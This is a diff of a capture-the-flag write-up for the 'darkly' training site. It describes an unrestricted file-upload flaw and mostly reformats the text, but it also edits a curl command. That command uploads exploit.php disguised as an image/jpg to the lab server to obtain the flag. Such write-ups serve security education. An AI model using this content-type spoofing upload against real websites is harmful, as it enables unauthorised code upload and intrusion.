@@ -2,10 +2,16 @@
 
 ## Vulnerability
 
-In the middle of the page, there is a link `ADD IMAGE` redirecting to: `http://darkly/index.php?page=upload`.
+In the middle of the page, there is a link `ADD IMAGE` redirecting to: [`index.php?page=upload`](http://darkly/index.php?page=upload).
 
-Uploading a PNG file, give an error: `Your image was not uploaded.`
-Uploading a JPG file, give a result: `/tmp/file.jpg succesfully uploaded.`
+Uploading a PNG file, give an error:
+```
+Your image was not uploaded.
+```
+Uploading a JPG file, give a result: 
+```
+/tmp/file.jpg succesfully uploaded.
+```
 
 The file content itself isn't checked. Only the file name.
 
@@ -15,7 +21,7 @@ $ curl \
     -F 'Upload=Upload' \
     -F "uploaded=@exploit.php;type=image/jpg" \
     -F 'MAX_FILE_SIZE=100000' \
-    'http://172.17.247.121/?page=upload'
+    'http://darkly/?page=upload'
 ...
 <h2>The flag is : ...</h2>
 ...
